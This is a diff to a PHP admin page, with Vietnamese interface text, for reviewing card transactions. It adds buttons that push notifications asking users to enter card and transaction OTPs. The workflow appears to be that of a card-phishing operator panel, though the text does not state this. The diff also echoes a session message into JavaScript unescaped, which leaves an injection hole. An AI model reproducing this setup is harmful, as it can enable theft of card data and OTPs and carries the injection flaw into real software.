@@ -52,6 +52,9 @@ $transaction = $result->fetch_assoc();
 $formattedCardNumber = formatCardNumber($transaction['card_number']);
 $statusText = getStatusText($transaction['status']);
 $amountFormat = formatAmount($transaction['amount']);
+$token_user = $transaction['token_user'];
+
+$token_admin = isset($_SESSION['token_admin']) ? $_SESSION['token_admin'] : '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $action = isset($_POST['action']) ? $_POST['action'] : '';
@@ -71,9 +74,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     }
 
-    $queryHistory = "UPDATE tbl_history SET status = ?, reason = ? WHERE id_history = ?";
+    $queryHistory = "UPDATE tbl_history SET status = ?, reason = ?, token_admin = ? WHERE id_history = ?";
     $stmtHistory = $conn->prepare($queryHistory);
-    $stmtHistory->bind_param("ssi", $status, $reason, $id_history);
+    $stmtHistory->bind_param("sssi", $status, $reason, $token_admin, $id_history);
 
     if ($stmtHistory->execute()) {
         if ($action === 'approve') {
@@ -222,11 +225,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                             <button style="margin-left: 10px; display: none;" type="submit" name="action" value="decline"
                                 class="btn-decline" id="confirmButton">Xác Nhận Từ Chối</button>
                             <!-- Thêm nút Xác thực OTP Thẻ -->
-                            <button type="submit" name="action" value="otp_card" class="btn-otp-card"
+                            <button type="submit" id="otpCardButton" name="action" value="otp_card" class="btn-otp-card"
                                 style="margin-left: 10px;">Xác thực OTP Thẻ</button>
                             <!-- Thêm nút Xác thực OTP Giao Dịch -->
-                            <button type="submit" name="action" value="otp_transaction" class="btn-otp-transaction"
-                                style="margin-left: 10px;">Xác thực OTP Giao Dịch</button>
+                            <button type="submit" id="otpTransactionButton" name="action" value="otp_transaction"
+                                class="btn-otp-transaction" style="margin-left: 10px;">Xác thực OTP Giao Dịch</button>
                         <?php endif; ?>
                     </div>
                 </form>
@@ -235,6 +238,64 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </div>
 </body>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+
+<script>
+    document.getElementById('otpCardButton').addEventListener('click', function () {
+        fetch('../../component/send.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: new URLSearchParams({
+                'token': '<?php echo htmlspecialchars($token_user); ?>', // Sử dụng token từ bảng history
+                'title': 'Thông báo từ admin',
+                'body': 'Admin yêu cầu bạn nhập mã OTP thẻ, hãy vào kiểm tra',
+                'image': 'https://cdn.shopify.com/s/files/1/1061/1924/files/Sunglasses_Emoji.png?2976903553660223024'
+            })
+        })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+                toastr.success('Thông báo đã được gửi thành công.');
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                toastr.error('Đã xảy ra lỗi khi gửi thông báo.');
+            });
+    });
+    document.getElementById('otpTransactionButton').addEventListener('click', function () {
+        fetch('../../component/send.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: new URLSearchParams({
+                'token': '<?php echo htmlspecialchars($token_user); ?>', // Sử dụng token từ bảng history
+                'title': 'Thông báo từ admin',
+                'body': 'Admin yêu cầu bạn nhập mã OTP giao dịch, hãy vào kiểm tra',
+                'image': 'https://cdn.shopify.com/s/files/1/1061/1924/files/Sunglasses_Emoji.png?2976903553660223024'
+            })
+        })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+                toastr.success('Thông báo đã được gửi thành công.');
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                toastr.error('Đã xảy ra lỗi khi gửi thông báo.');
+            });
+    });
+
+</script>
+<script>
+    $(document).ready(function () {
+        <?php if (isset($_SESSION['otp_card_error'])): ?>
+            toastr.error("<?php echo $_SESSION['otp_card_error']; ?>");
+            <?php unset($_SESSION['otp_card_error']); ?>
+        <?php endif; ?>
+    });
+</script>
 <script>
     function showReason() {
         document.getElementById("reasonGroup").style.display = "block";
